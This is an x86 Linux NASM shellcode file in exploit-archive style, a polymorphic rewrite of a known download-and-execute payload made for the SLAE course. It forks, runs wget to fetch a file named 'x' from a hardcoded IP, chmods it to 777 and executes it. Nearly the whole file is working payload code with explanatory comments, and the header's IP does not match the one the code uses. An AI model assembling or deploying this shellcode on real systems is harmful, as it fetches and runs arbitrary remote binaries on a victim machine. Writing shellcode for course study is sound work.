; Exploit Title: Donload, chmod and execute (poly shellcode-862.php)
; Date: November 29th, 2018
; Exploit Author: Nelis
; Version: 0.1
; Tested on: Ubuntu 12.10
; Filename: downexec.nasm
; SLAE-ID: 1327
; Based on: http://shell-storm.org/shellcode/files/shellcode-862.php

; Shellcode:
; - download 192.168.2.222/x with wget
; - chmod x
; - execute x
; - x is an executable
; - length 108 bytes

global _start

section .text

_start:

    ;fork		; fork()  creates  a new process by duplicating the calling process.
    sub eax,eax		; empty eax register - changed from: xor eax, eax
    add al,0x2		; set syscall to #define __NR_fork 2 - changed from: mov al,0x2
    int 0x80		; make syscall
    sub ebx,ebx		; empty ebx register - changed from xor ebx, ebx
    cmp eax,ecx 	; compare eax wit ebx (0) - chenged to compare with other (ecx) zero register 
    jz child		; When ZF is set (if eax equals ebx in previous cmp, then jump to child:
  
    ;wait(NULL)		;  The  wait() system call suspends execution of the calling process until
			;       one of its children terminates.
    sub eax,eax		; empty eax register- changed from: xor eax, eax
    add al,0x7		; set syscall to #define __NR_waitpid 7 - changed from: mov al,0x7
    int 0x80		; Start the wait()
        
    ;chmod x		; int chmod(const char *path, mode_t mode)
;    xor ecx,ecx		; empty ecx register - removed, ecx is already zero
    sub eax, eax	; empty eax register - changed from xor eax, eax
    push ecx		; push eax on the stack - changed from push eax - any zero register will do the job
    add al, 0xf		; set syscall to #define __NR_chmod 15 (=0xf) - changed from mov al, 0xf
    push 0x78		; define path =x (ASCII) = 0x78(hex)
    mov ebx, esp	; mov into ebx pointer to esp (path)
;    xor ecx, ecx	; empty ecx register - removed, ecx is already zero
    add cx, 0x1ff	; set file permissions (777 octal) - changed from mov cx, 0x1ff
    int 0x80		; make syscall
    
    ;exec x
;    xor eax, eax	; empty eax register - removed, eax is already zero
    push edx		; push 0 term on stack -  changed from push eax, any zero register will do
    push 0x78		; define path =x (ASCII) = 0x78(hex)
    mov ebx, esp	; move into ebx pointer to esp (path)
    push edx		; push 0 term on the stack -  changed from push eax, any zero register will do
    mov edx, esp	; save into edx the 0 term
    push ebx		; push pointer to esp(path) on the stack
    mov ecx, esp	; move into ecx pointer to ebx (path)
    add al, 0xb		; set syscall execve - changed from: mov al, 0x5
    int 0x80		; make syscall
    
child:
    ;download 192.168.1.48//x with wget
   ; push 0xb		; set syscall execve, removed
   ; pop eax		; save into eax the execve syscall nr, removed 
    mov al, 0xb		; combined previous two instructions
   ; cdq			; set edx to zero - removed, is already zero
    push ecx		; push NULL to stack - changed from push edx, any zero register will do
    
    push 0x782f2f2f 	;///x avoid null byte
    push 0x38342e31 	;48.1
    push 0x2e383631 	;.861
    push 0x2e323931 	;.291
    mov ecx,esp		; save pointer to ip address in ecx	
    push ebx		; push NULL to the stack, changed from: push edx, any zero register will do
    
    push 0x74 		; t
    push 0x6567772f 	; egw/
    push 0x6e69622f 	; nib/
    push 0x7273752f 	; rsu/
    mov ebx,esp		; save pointer to command in ebx	
    push esi		; push null on stack, changed from push edx, any zero register will do
    push ecx		; push ip address
    push ebx		; push command for download
    mov ecx,esp		; pointer to command instrunction set in ecx 
    int 0x80		; make syscall
    
